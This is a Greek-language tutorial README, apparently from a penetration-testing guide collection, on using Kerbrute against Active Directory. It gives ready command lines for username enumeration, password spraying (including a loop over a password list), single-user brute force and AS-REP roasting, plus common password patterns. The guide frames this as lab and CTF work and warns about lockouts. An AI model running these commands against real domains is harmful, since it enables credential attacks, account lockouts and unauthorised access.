# 🔑 Kerbrute — Αναζήτηση λογαριασμών μέσω Kerberos

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Έλεγχοι ονομάτων χρήστη και διαπιστευτηρίων Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## Πριν ξεκινήσετε

Το **Kerbrute** επικοινωνεί με την υπηρεσία **Kerberos** ενός domain. Η λειτουργία **userenum** εξετάζει την ύπαρξη ονόματος χρήστη, ενώ οι λειτουργίες δοκιμής κωδικών επιχειρούν αυθεντικοποίηση. Πρόκειται για διαφορετικές ενέργειες με διαφορετική επίδραση στην πολιτική λογαριασμών.

**Βασικοί όροι:** *Domain Controller/KDC* = σύστημα που εξυπηρετεί την αυθεντικοποίηση του domain, *pre-authentication* = αρχική απόδειξη γνώσης κατάλληλου μυστικού, *password spraying* = ένας υποψήφιος κωδικός σε πολλούς χρήστες, *brute force* = δοκιμή πολλών υποψήφιων τιμών, *lockout* = κλείδωμα λογαριασμού μετά από αποτυχίες.

Χρησιμοποιήστε τα παραδείγματα σε συμφωνημένο εργαστήριο. Η ύπαρξη χρήστη δεν αποδεικνύει έγκυρο κωδικό ή πρόσβαση σε υπηρεσία. Οι εντολές του πρωτοτύπου παραμένουν ίδιες και δεν εκτελούνται κατά τη μετάφραση.

## 📋 Περιεχόμενα

- [Τι είναι το Kerbrute](#section-01)
- [Εγκατάσταση](#section-02)
- [Συλλογή πληροφοριών χρηστών](#section-03)
- [Δοκιμή λίγων κωδικών σε πολλούς λογαριασμούς (Password Spraying)](#section-04)
- [Δοκιμή στοιχείων σύνδεσης από λίστες](#section-05)
- [Γρήγορη αναφορά](#section-06)
- [Συμβουλές για εργαστήρια CTF](#section-07)
- [Πηγές](#section-08)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Kerbrute

**Το Kerbrute** χρησιμοποιεί διαφορετικές ανταλλαγές Kerberos για αναζήτηση ονομάτων χρήστη και δοκιμές διαπιστευτηρίων:

- 🔍 **Αναζήτηση χρηστών** — διερεύνηση ύπαρξης ονόματος χωρίς προηγούμενη σύνδεση
- 🔐 **Password spraying** — δοκιμή ενός κωδικού σε πολλούς χρήστες
- 💥 **Brute force** — δοκιμή υποψήφιων κωδικών ή ζευγών διαπιστευτηρίων
- ⚠️ **Διαφορετικός κίνδυνος ανά λειτουργία** — οι αποτυχημένες δοκιμές κωδικού μπορούν να προκαλέσουν κλείδωμα λογαριασμών

### Χρήσεις και περιορισμοί του Kerbrute

> **Ο πίνακας του πρωτοτύπου υπεργενικεύει:** Η αναζήτηση ονόματος χωρίς pre-authentication διαφέρει από αποτυχημένη δοκιμή κωδικού. Το passwordspray αυξάνει αποτυχίες και μπορεί να κλειδώσει λογαριασμούς. Παράγονται επίσης σχετικά συμβάντα. Δείτε το [επίσημο Kerbrute](https://github.com/ropnop/kerbrute).


| Μέθοδος | Επίδραση στο κλείδωμα λογαριασμού | Καταγραφή συμβάντων |
| -------- | ------------------ | ---------------- |
| Αυθεντικοποίηση LDAP Bind | Ναι | Ναι |
| Αυθεντικοποίηση SMB | Ναι | Ναι |
| **Kerberos** | **Η αναζήτηση ονόματος διαφέρει από αποτυχημένη δοκιμή κωδικού** | Καταγραφή ανάλογα με πολιτική και λειτουργία |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

### Λήψη έτοιμου εκτελέσιμου

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows μέσω PowerShell
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### Εγκατάσταση από πηγαίο κώδικα

```bash
go install github.com/ropnop/kerbrute@latest
```

### Επαλήθευση εγκατάστασης

```bash
kerbrute --help
```

---

<a id="section-03"></a>

## 🔍 Συλλογή πληροφοριών χρηστών

### Βασική χρήση

```bash
# Αναζήτηση χρηστών από λίστα υποψήφιων ονομάτων
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Με όνομα Domain Controller
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Επιλογές αποτελεσμάτων

> **Μορφή και εκδόσεις:** Το --json δεν εμφανίζεται στην επίσημη βασική βοήθεια του έργου. Το -o αποθηκεύει καταγραφές και δεν εγγυάται αρχείο με ένα καθαρό username ανά γραμμή. Ελέγξτε την πραγματική έξοδο πριν τη δώσετε σε άλλο εργαλείο.


```bash
# Αναλυτική έξοδος
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Αποθήκευση σε αρχείο
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# Έξοδος JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Παράλληλες εργασίες

> **Ρυθμός χωρίς εγγύηση:** Η επίσημη βοήθεια αναφέρει ότι με delay χρησιμοποιείται ένα thread. Χαμηλός ρυθμός ή αναμονή 5 λεπτών δεν εγγυώνται αποφυγή κλειδώματος ή καταγραφής. Τα όρια καθορίζονται από την πραγματική πολιτική και τις συνολικές αποτυχίες.


```bash
# Περισσότερες παράλληλες εργασίες, με προεπιλογή 10 κατά το πρωτότυπο
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Παράδειγμα με καθυστέρηση· δεν εγγυάται ασφαλή ρυθμό
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Ενδεικτική έξοδος

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

<a id="section-04"></a>

## 🔐 Δοκιμή λίγων κωδικών σε πολλούς λογαριασμούς (Password Spraying)

### Βασική δοκιμή ενός κωδικού σε πολλούς χρήστες

```bash
# Ένας υποψήφιος κωδικός σε λίστα χρηστών
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Από αρχείο
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Πολλαπλοί υποψήφιοι κωδικοί

```bash
# Διαδοχικές δοκιμές κωδικών στο παράδειγμα
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Αναμονή 5 λεπτών του παραδείγματος· δεν εγγυάται αποφυγή κλειδώματος
done
```

### Αποθήκευση αποτελεσμάτων

```bash
# Αποθήκευση αποτελεσμάτων με έγκυρα διαπιστευτήρια
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Ενδεικτική έξοδος

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Έλεγχος πολιτικής και περιορισμός ρυθμού

```bash
# Πρώτα ελέγξτε την εφαρμοζόμενη πολιτική κωδικών και κλειδώματος
crackmapexec ldap DC01 -u user -p pass --password-policy

# Περιορισμένος ρυθμός και παραλληλία
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

<a id="section-05"></a>

## 💥 Δοκιμή στοιχείων σύνδεσης από λίστες

### Δοκιμή λίστας κωδικών για έναν χρήστη

```bash
# Το bruteuser δοκιμάζει κωδικούς για έναν χρήστη, όχι κάθε ζεύγος δύο λιστών
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Λίστα συνδυασμών χρήστη και κωδικού

```bash
# Χρήση μορφής username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Ενδεικτική μορφή creds.txt:
# admin:Password1
# john:Summer2024
```

---

<a id="section-06"></a>

## 📊 Γρήγορη αναφορά

### Εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `userenum` | Αναζήτηση έγκυρων ονομάτων χρήστη |
| `passwordspray` | Δοκιμή ενός κωδικού σε λίστα χρηστών |
| `bruteuser` | Δοκιμή κωδικών για έναν χρήστη |
| `bruteforce` | Δοκιμή ζευγών χρήστη και κωδικού |

### Βασικές επιλογές

| Επιλογή | Περιγραφή |
| -------- | ------------- |
| `-d` | Όνομα domain |
| `--dc` | IP ή όνομα Domain Controller |
| `-t` | Παράλληλες εργασίες (threads, προεπιλογή: 10) |
| `-o` | Αρχείο εξόδου |
| `-v` | Αναλυτική έξοδος |
| `--delay` | Καθυστέρηση μεταξύ προσπαθειών σε milliseconds |

### Συλλογή πληροφοριών χρηστών

```bash
# Βασική κατά το πρωτότυπο
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Με αποθήκευση αποτελεσμάτων
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Γρήγορο
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Δοκιμές κωδικών σε πολλούς λογαριασμούς

```bash
# Δοκιμή ενός κωδικού σε πολλούς χρήστες
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Περιορισμός ρυθμού χωρίς εγγύηση αποφυγής κλειδώματος
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Λίστες υποψήφιων ονομάτων χρήστη

```bash
# Συνήθη ονόματα
/usr/share/seclists/Usernames/Names/names.txt

# Συνήθη ονόματα χρήστη
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Προσαρμοσμένη μορφή
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Ενδεικτικά μοτίβα κωδικών

```
Εποχή+Έτος: Summer2024!, Winter2024!, Fall2024!
Εταιρεία+Αριθμός: CompanyName123!, Company2024!
Γενικά παραδείγματα: Password1, Welcome1, P@ssw0rd
```

---

<a id="section-07"></a>

## 🎯 Συμβουλές για εργαστήρια CTF

1. **Πρώτα καταγραφή χρηστών** — διακρίνετε την ύπαρξη ονόματος από την επιτυχή σύνδεση.
2. **Έλεγχος ρύθμισης pre-authentication** — η ύπαρξη χρήστη δεν αποδεικνύει απουσία αυτού του ελέγχου.
3. **Περιορισμένες δοκιμές** — τηρείτε την πολιτική του εγκεκριμένου εργαστηρίου.
4. **Ελέγξτε την πολιτική** — όρια και χρόνοι κλειδώματος επηρεάζουν τη δοκιμή.
5. **Καθυστέρηση αιτημάτων** — μειώνει τον ρυθμό, χωρίς να εγγυάται αφάνεια ή αποφυγή κλειδώματος.

### Ροή εργασίας

> **Έλεγχος εισόδου:** Το users.txt του πρώτου βήματος μπορεί να περιέχει timestamps και μηνύματα, όχι μόνο ονόματα. Επιβεβαιώστε τη μορφή πριν από το επόμενο βήμα. Η εύρεση ονόματος δεν αποδεικνύει ότι ο λογαριασμός επιτρέπει AS-REP χωρίς pre-authentication.


```bash
# 1. Αναζήτηση ονομάτων χρήστη
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Έλεγχος λογαριασμών χωρίς υποχρεωτική pre-authentication
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Ενδείξεις δοκιμών κωδικών σε πολλούς χρήστες
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

<a id="section-08"></a>

## 📚 Πηγές

- [Πηγαίος κώδικας Kerbrute](https://github.com/ropnop/kerbrute)
- [Ιστολόγιο δημιουργού Kerbrute](https://blog.ropnop.com/)

### Σχετικοί οδηγοί
- [Μεθοδολογία ελέγχων Active Directory](../../AD-Attack-Methodology/translations/README.el.md)
- [Rubeus](../../Rubeus/translations/README.el.md)
- [CrackMapExec](../../CrackMapExec/translations/README.el.md)

---

<p align="center">
  <b>🔑 Διακρίνετε την αναζήτηση χρηστών από τις δοκιμές κωδικών!</b><br>
  <i>Kerbrute — κατανόηση ανταλλαγών Kerberos</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
